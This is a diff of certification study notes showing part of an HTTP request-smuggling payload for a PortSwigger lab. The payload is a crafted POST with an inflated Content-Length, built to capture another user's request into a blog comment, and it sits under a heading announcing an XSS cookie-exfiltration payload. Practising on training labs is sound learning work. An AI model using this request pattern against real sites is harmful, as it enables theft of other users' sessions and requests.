@@ -37,6 +37,7 @@ BSCP NOTES PREPAPATION
 * **PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests**
   📝 Комментарии + корректная работа с `Content-Length`
   (см. notes)
+```html  
 POST / HTTP/1.1
 Host: 0ab900800495c1fc85f60e850077000a.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -51,7 +52,7 @@ Content-Length: 920
 Cookie: session=qEApwbqQoQV5bqG8LQrnAvl3VQggWnaX
 
 csrf=Vwd8rkZxtPiqYWlzRk6hzpAPXyXMqEpY&postId=8&name=c&email=c%40c.c&website=&comment=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddccccccccc
-
+```
 ---
 
 ## 💉 XSS → Cookie Exfiltration (Classic Payload)
